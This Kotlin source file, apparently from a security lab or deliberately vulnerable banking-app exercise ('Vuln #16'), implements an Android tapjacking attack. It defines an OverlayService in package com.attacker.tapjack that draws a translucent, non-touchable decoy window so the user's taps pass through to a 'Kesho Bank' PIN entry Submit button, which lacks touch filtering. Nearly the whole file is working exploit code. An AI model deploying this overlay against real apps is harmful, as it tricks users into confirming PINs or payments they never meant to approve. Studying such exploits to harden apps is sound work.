package com.attacker.tapjack

import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager

// Vuln #16: adds a FLAG_NOT_TOUCHABLE overlay window on top of whatever's
// running underneath (Kesho Bank's PinEntryActivity, if the user has
// switched to it). Because the overlay doesn't consume touches, taps pass
// straight through to the real view beneath the decoy banner. Android marks
// those passed-through touches with MotionEvent.FLAG_WINDOW_IS_OBSCURED,
// which only matters if the view underneath calls
// setFilterTouchesWhenObscured(true). PinEntryActivity never does, so its
// Submit button fires normally, confirming a PIN the user thought they
// never touched.
class OverlayService : Service() {

    private var overlayView: View? = null
    private lateinit var windowManager: WindowManager

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        showOverlay()
        return START_NOT_STICKY
    }

    private fun showOverlay() {
        if (overlayView != null) return
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val view = LayoutInflater.from(this).inflate(R.layout.overlay_decoy, null)
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
        }

        windowManager.addView(view, params)
        overlayView = view
    }

    private fun hideOverlay() {
        overlayView?.let { windowManager.removeView(it) }
        overlayView = null
    }

    override fun onDestroy() {
        hideOverlay()
        super.onDestroy()
    }
}
